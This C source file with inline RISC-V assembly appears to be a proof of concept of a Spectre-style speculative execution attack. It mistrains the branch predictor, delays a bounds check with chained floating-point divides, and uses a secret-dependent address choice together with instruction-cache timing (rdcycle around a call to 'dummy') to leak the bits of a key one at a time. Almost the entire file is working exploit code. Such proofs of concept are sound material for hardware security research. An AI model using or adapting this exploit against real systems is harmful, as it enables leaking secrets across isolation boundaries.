
#include <stdio.h>
#include <stdint.h> 
#include "cache.h"
#include "icache.h"
#include "dummy.h"
#define read_csr(reg) ({ unsigned long __tmp; \
    asm volatile ("csrr %0, " #reg : "=r"(__tmp)); \
    __tmp; })
  #define rdcycle() read_csr(cycle) 


  #define TRAIN_TIMES         1023    // 
  #define ROUNDS              1    // run the train + attack sequence X amount of times (for redundancy)
  #define ATTACK_SAME_ROUNDS  10   // amount of times to attack the same index
  #define SECRET_SZ           26
  #define CACHE_HIT_THRESHOLD 30
  #define PAGE_SZ 4096

#define BARRIER asm volatile ("fence rw, rw" ::: "memory");
uint64_t array1_sz = 16;
uint8_t unused1[64];
uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
uint8_t unused2[64];
uint8_t array2[256 * L1_BLOCK_SZ_BYTES];
uint64_t secret;
int KEY='W';

void topTwoIdx(uint64_t* inArray, uint64_t inArraySize, uint8_t* outIdxArray, uint64_t* outValArray) {
    outValArray[0] = 0; outValArray[1] = 0;
    for (uint64_t i = 0; i < inArraySize; ++i) {
        if (inArray[i] > outValArray[0]) {
            outValArray[1] = outValArray[0]; outValArray[0] = inArray[i];
            outIdxArray[1] = outIdxArray[0]; outIdxArray[0] = i;
        }
        else if (inArray[i] > outValArray[1]) {
            outValArray[1] = inArray[i]; outIdxArray[1] = i;
        }
    }
}

int temp,acc;
void victimFunc(uint64_t idx) {
    uint8_t tep = 2;
    //  printf("secret idx %d \n",idx);
    uint8_t *arr = &array2[0*L1_BLOCK_SZ_BYTES];
    uint64_t *s = &secret;
    uint64_t *b = &idx;
    // uint64_t *addr= &dummy;
    uint64_t *c = &array1_sz;

     flushCache((uint64_t)&array2[40*L1_BLOCK_SZ_BYTES],L1_BLOCK_SZ_BYTES);
     BARRIER 
     array1_sz =  array1_sz << 4;
     asm("fcvt.s.lu	fa4, %[in]\n"
        "fcvt.s.lu	fa5, %[inout]\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fdiv.s	fa5, fa5, fa4\n"
        "fcvt.lu.s	%[out], fa5, rtz\n"
        : [out] "=r" (array1_sz)
        : [inout] "r" (array1_sz), [in] "r" (tep)
        : "fa4", "fa5");

        // asm volatile(
        //     R"(
        //         # t1 = *b (32-bit)
        //         lw      t1, 0(%0)
        //         # t0 = *c (32-bit)
        //         lw      t0, 0(%1)
            
        //         # if (*c <= *b) unsigned -> done   (x86: cmp r11d, eax; jbe done)
        //        bgeu    t1, t0, 1f
            
        //         # call dummy
        //        call    dummy
            
        //     1:  # done
        //     )"
        //     :
        //     : "r"(b), "r"(c), "r"(s), "r"(arr)
        //     : "t0","t1","t2","t3","t4","t5","t6","ra","memory");
        // if (idx < array1_sz) tep = array2[40 * L1_BLOCK_SZ_BYTES];
    
        asm volatile(
            R"(
                # t1 = *b (32-bit)
                lw      t1, 0(%0)
                # t0 = *c (32-bit)
                lw      t0, 0(%1)
            
                # if (*c <= *b) unsigned -> done   (x86: cmp r11d, eax; jbe done)
                bgeu    t1, t0, 1f
            
                # t2 = *s (32-bit)
                lw      t2, 0(%2)
            
                # rdx = 0x40  -> t3
                li      t3, 0x40
                # rcx = 0xA00 -> t4 
                li      t4, 0xA00
            
                # ----- cmove %%rdx, %%rcx  when (t2 == 0)  -----
                # if (t2==0) rcx=t3 else rcx 
                #  Zicond:
                #   a = czero.eqz(t3, t2)   # t2==0  -> a=t3; else a=0
                #   b = czero.nez(t4, t2)   # t2!=0  -> b=t4; else b=0
                #   t4 = a | b             
                czero.eqz t5, t3, t2
                czero.nez t4, t4, t2
                or      t4, t5, t4
                # ----------------------------------------------
            
                add     t5, t4, %3
            
                ld      t6, 0(t5)
            
                .rept 150
                   add t6, t6, t6
                .endr
            
                call    dummy
            
            1:  # done
            )"
            :
            : "r"(b), "r"(c), "r"(s), "r"(arr)
            : "t0","t1","t2","t3","t4","t5","t6","ra","memory");

    
}


int main(void) {
    uint64_t attackIdx = 40;//(uint64_t)(secretString - (char*)array1);
    uint64_t start, diff, passInIdx, randIdx,effIdx,effSec;
    uint8_t temp;
    // uint8_t dummy = 0;
    static uint64_t results[256];

    for(int len = 7; len >=0; --len) {
        // for(uint64_t i = 0; i < 256; ++i) results[i] = 0;
        int junk = 0;
        int train = 0;
        register uint64_t time1, time2;
        volatile uint8_t *addr;
        //  secret = len%2;
        secret=(KEY>>len)&1;
        array2[1*L1_BLOCK_SZ_BYTES]=1;
        array2[40*L1_BLOCK_SZ_BYTES]=40;
        //  printf("secret%d\n",secret);

            for(int64_t j = ((TRAIN_TIMES+1)*ROUNDS)-1; j >= 0; --j) {
                randIdx = 3;
                
                passInIdx = ((j % (TRAIN_TIMES+1)) - 1) & ~0xFFFF; // after every TRAIN_TIMES set passInIdx=...FFFF0000 else 0
                passInIdx = (passInIdx | (passInIdx >> 16)); // set the passInIdx=-1 or 0
                effIdx = randIdx ^ (passInIdx & (attackIdx ^ randIdx)); // select randIdx or attackIdx 
                // effSec =(train ^ (passInIdx & (secret ^ train)));
                flushCache((uint64_t)&array2[40*L1_BLOCK_SZ_BYTES],L1_BLOCK_SZ_BYTES);
                flushICache((uint64_t)&dummy,L1_BLOCK_SZ_BYTES);
                temp &= array2[1* L1_BLOCK_SZ_BYTES];
                // _mm_clflush(&dummy); 
                BARRIER 
                for(uint64_t k = 0; k < 20; ++k) asm(""); // set of constant takens to make the BHR be in a all taken state
                // call function to tsrain or attack
                victimFunc(effIdx);
            }
            
            //  dummy();
            // temp &= array2[40* L1_BLOCK_SZ_BYTES];
            // temp &= array2[1* L1_BLOCK_SZ_BYTES];
                uint64_t start = rdcycle();
                dummy();
                uint64_t diff = rdcycle() - start;
                printf("%d,%d\n",(diff > 180), diff);

    }

    return 0;
}
